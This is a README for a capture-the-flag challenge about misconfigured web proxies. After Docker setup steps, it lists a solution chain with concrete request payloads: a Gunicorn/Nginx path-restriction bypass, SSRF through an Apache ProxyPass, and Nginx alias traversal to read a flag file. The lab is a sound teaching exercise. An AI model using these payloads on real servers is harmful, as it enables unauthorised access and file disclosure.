# weird_proxies_ctf

Insiperd by [https://github.com/GrrrDog/weird_proxies](https://github.com/GrrrDog/weird_proxies)

## Installation
- Find all `TODO` and follow
- Change flag at `backend_nginx/flag`
- `docker-compose build`
- `docker-compose up`
- task access `http://localhost:8082/`

## Solving steps
1. Gunicorn + Nginx 403 `/admin` path restriction bypass via [technique](https://speakerdeck.com/greendog/2-and-a-bit-of-magic?slide=14): `GET /admin<TAB>HTTP/1.1/../../ HTTP/1.1`
2. Find path as random UUID from the response: `/c7f5472b-4e09-4997-9eff-e1b7442b8b91/`
3. Find `/c7f5472b-4e09-4997-9eff-e1b7442b8b91/wiki/` path with other backend
4. Exploit SSRF via misconfigured Apache ProxyPass: `/c7f5472b-4e09-4997-9eff-e1b7442b8b91//wiki/@backend_nginx`
5. Exploit Nginx alias traversal for limited file reading: `/c7f5472b-4e09-4997-9eff-e1b7442b8b91/wiki/@backend_nginx/imgs../flag`
